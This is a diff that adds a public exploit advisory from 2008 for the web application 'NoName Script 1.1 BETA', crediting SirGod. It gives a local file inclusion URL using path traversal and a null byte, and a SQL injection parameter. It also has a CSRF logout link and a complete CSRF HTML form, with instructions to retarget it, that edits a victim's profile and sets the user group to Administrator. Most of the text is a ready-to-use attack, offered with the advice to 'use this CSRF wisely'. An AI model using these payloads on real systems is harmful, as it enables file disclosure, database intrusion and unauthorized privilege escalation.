@@ -1,0 +1,196 @@
+################################################################################
+[+] NoName Script 1.1 BETA Multiple Remote Vulnerabilities  
+[+] Discovered By SirGod                         
+[+] www.mortal-team.org                         
+[+] Greetz : E.M.I.N.E.M,Ras,Puscas_marin,ToxicBlood,MesSiAH,xZu,HrN,kemrayz
+#################################################################################
+
+[+] Local File Inclusion
+
+     http://localhost/index.php?action=../../../autoexec.bat%00&kategorie=Tutorial
+     
+    This will open autoexec.bat .
+
+[+] SQL Injection   
+
+     http://localhost/index.php?action=newsadmindel&file_id=[SQL]
+     
+[+] Cross Site Request Forgery     
+
+     If an logged in user with administrative permisions will click the following link ,he will be logged out.
+
+     http://localhost/logout.php
+
+[+] Cross Site Request Forgery - Change User Profile
+
+    If an logged in user with administrative permisions will click the following link the following action will be executed.
+
+    What to change :
+   
+    - form action and profil_id : <form action="http://localhost/index.php?action=editsettings&profil_id=67" method="post" ....etc >
+       action : change http://localhost with the website link.
+       profil_id : id of the user that you want to change settings for it
+    - input value : <td><input name="edit_benutzername" disabled="disabled" value="Sirgod" type="text"></td>
+       value : your name (corresponding to ID)
+      
+    And now edit the other settings change via web browser.After that,use this CSRF wisely.
+
+[+] Here is the HTML code :   
+
+<form action="http://localhost/index.php?action=editsettings&profil_id=67" method="post" name="editsettings" id="editsettings">
+        <input name="sent" value="1" type="hidden">
+
+    <center><table border="0" cellpadding="3" cellspacing="0">
+        <tbody><tr>
+            <td colspan="2" style="font-weight: bold;">
+                Benutzerinformationen
+            </td>
+        </tr>
+        <tr>
+            <td>Benutzername:&nbsp;</td>
+            <td><input name="edit_benutzername" disabled="disabled" value="Sirgod" type="text"></td>
+
+        </tr>
+        <tr>
+            <td>Benutzergruppe:&nbsp;</td>
+            <td>
+                                <select name="edit_benutzergruppe" size="1">
+                                                <option value="0">User</option>
+                            <option value="1">Premium Member</option>
+
+                            <option value="2">Deleter</option>
+                            <option value="3">Moderator</option>
+                            <option value="4" selected="selected">Administrator</option>
+                                            </select>
+            </td>
+        </tr>
+        <tr>
+            <td colspan="2"><hr></td>
+
+        </tr>
+        <tr>
+            <td colspan="2" style="font-weight: bold;">
+                Zusätzliche Informationen
+            </td>
+        </tr>
+        <tr>
+            <td>Geschlecht:&nbsp;</td>
+            <td>
+
+                <select name="edit_geschlecht" size="1">
+                                                <option value="">keine Angabe</option>
+                            <option value="m" selected="selected">männlich</option>
+                            <option value="w">weiblich</option>
+                                            </select>
+            </td>
+        </tr>
+
+        <tr>
+            <td>Geburtstag:&nbsp;</td>
+            <td>
+                <select name="edit_gb_tag" size="1">
+                    <option value="">&nbsp;</option>
+                    <option value="1">1</option><option value="2">2</option><option value="3"
+
+selected="selected">3</option><option value="4">4</option><option value="5">5</option><option
+
+value="6">6</option><option value="7">7</option><option value="8">8</option><option value="9">9</option><option
+
+value="10">10</option><option value="11">11</option><option value="12">12</option><option
+
+value="13">13</option><option value="14">14</option><option value="15">15</option><option
+
+value="16">16</option><option value="17">17</option><option value="18">18</option><option
+
+value="19">19</option><option value="20">20</option><option value="21">21</option><option
+
+value="22">22</option><option value="23">23</option><option value="24">24</option><option
+
+value="25">25</option><option value="26">26</option><option value="27">27</option><option
+
+value="28">28</option><option value="29">29</option><option value="30">30</option><option value="31">31</option>          
+
+     </select>
+
+                <select name="edit_gb_monat" size="1">
+                    <option value="">&nbsp;</option>
+                    <option value="1">Januar</option><option value="2">Februar</option><option value="3">März</option><option
+
+value="4">April</option><option value="5">Mai</option><option value="6">Juni</option><option
+
+value="7">Juli</option><option value="8">August</option><option value="9">September</option><option
+
+value="10">Oktober</option><option value="11" selected="selected">November</option><option
+
+value="12">Dezember</option>                </select>
+
+                <input name="edit_gb_jahr" style="width: 45px;" maxlength="4" value="1991" type="text">
+            </td>
+        </tr>
+        <tr>
+            <td valign="top">Benutzertext:&nbsp;</td>
+            <td><textarea name="edit_beschreibung" style="width: 270px; height: 90px;">Was geht aaaab xD</textarea>
+        </td></tr>
+        <tr>
+
+            <td>Homepage:&nbsp;</td>
+            <td><input name="edit_homepage" value="http://paddys.tk" type="text"></td>
+        </tr>
+        <tr>
+            <td colspan="2"><hr></td>
+        </tr>
+        <tr>
+            <td colspan="2" style="font-weight: bold;">
+
+                Instant Messaging
+            </td>
+        </tr>
+        <tr>
+            <td>ICQ-Nummer:&nbsp;</td>
+            <td><input name="edit_icq" value="" type="text"></td>
+        </tr>
+        <tr>
+            <td>MSN-Name:&nbsp;</td>
+
+            <td><input name="edit_msn" value="" type="text"></td>
+        </tr>
+        <tr>
+            <td>AIM-Name:&nbsp;</td>
+            <td><input name="edit_yahoo" value="" type="text"></td>
+        </tr>
+                <tr>
+            <td colspan="2"><hr></td>
+
+        </tr>
+        <tr>
+            <td colspan="2" style="font-weight: bold;">
+                Verwarnungen
+            </td>
+        </tr>
+        <tr>
+            <td>&nbsp;</td>
+            <td>
+
+            Admin wurde noch nicht verwarnt.            </td>
+        </tr>
+        <tr>
+            <td>Aktion:&nbsp;</td>
+            <td>
+                <a href="#" onclick="HelpPopup('verwarn.php?profil_id=24');">Verwarnungen verwalten</a>
+            </td>
+
+        </tr>
+                <tr>
+            <td colspan="2">&nbsp;</td>
+        </tr>
+        <tr>
+            <td>&nbsp;</td>
+            <td><input name="submit" value="Speichern" type="submit"></td>
+        </tr>
+
+    </tbody></table></center>
+    </form>
+
+#################################################################################
+
+# milw0rm.com [2008-08-23]
